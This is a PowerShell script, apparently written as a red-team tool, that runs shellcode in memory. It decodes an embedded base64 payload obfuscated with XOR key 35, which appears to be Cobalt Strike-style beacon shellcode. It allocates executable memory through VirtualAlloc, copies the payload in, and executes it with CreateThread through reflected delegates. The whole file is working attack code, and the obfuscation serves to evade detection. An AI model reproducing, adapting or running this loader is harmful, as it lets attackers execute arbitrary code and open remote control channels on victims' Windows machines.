<#
Author: Dennys Simbolon
Date  : 01-06-2025

Basic powershell shellcode runner script. It loads kernel32 library from disk using Project Zero's NtApiDotNet,
and resolve Windows API (VirtualAlloc, CreateThread) address from unmanaged code to allocate buffer in current process memory
and create a new thread to execute the code in the allocated buffer. This script is inspired from Cobalt Strike powershell payload.

#>

$k32 = Import-Win32Module("C:\Windows\System32\kernel32.dll")
$virtual_alloc = $k32.GetProcAddress("VirtualAlloc")
$create_thread = $k32.GetProcAddress("CreateThread")

[Byte[]]$task = [System.Convert]::FromBase64String("32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDFsWRmgj/rDVtxidgvTGOaC8lvYpIsdV8gIVuG+IGTvxEBTsRgKZPb+yPcTLLnSuow0okQMMUOfeFQzX4HcrekoF9/35GhdnX08Oao0NMCN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN0bHQVFxgDd1FKR0ZNVwwWDRMYA2JVQk1XA2FRTFRQRlEKLikjeFqmc3ZD7y3/gIabPymw7QZ+6TkjzaV/goJ3dR02TgtwOChyCPSuanprxuJFoT3piETij2s8Kyt9mTeO5Qo2qzNLeKIsUKkaa6YpUeNnbWDs642JNytn3Xr3+37WbgZKpJUwiDl06jMApXdxl/xhcBtB5RsAELo/r9HnbUf5cGiSMrlSqBvTW1X8bn5hE2NJPbZ/ZF1o9Q55noMY6OEaFx+6CVMeVQxeT3PlIUU4P9ITClDr8S7bQ32VCvpSq2/Q4mIhH8+J8BlaDyUjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3BITDRITDRYNEhATIxn9S5I=")

for ($byte = 0; $byte -lt $task.Count; $byte++) {
	$task[$byte] = $task[$byte] -bxor 35
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $parameters,
		[Parameter(Position = 1)] [Type] $return_type = [Void]
	)

	$type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $parameters).SetImplementationFlags('Runtime, Managed')
	$type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $return_type, $parameters).SetImplementationFlags('Runtime, Managed')

	return $type_builder.CreateType()
}

$va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(($virtual_alloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$buffer = $va.Invoke([IntPtr]::Zero, $task.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($task, 0, $buffer, $task.Length)

$crt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(($create_thread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [UInt32]) ([IntPtr])))
$thandle=$crt.Invoke([IntPtr]::Zero,0,$buffer,[IntPtr]::Zero,0,0);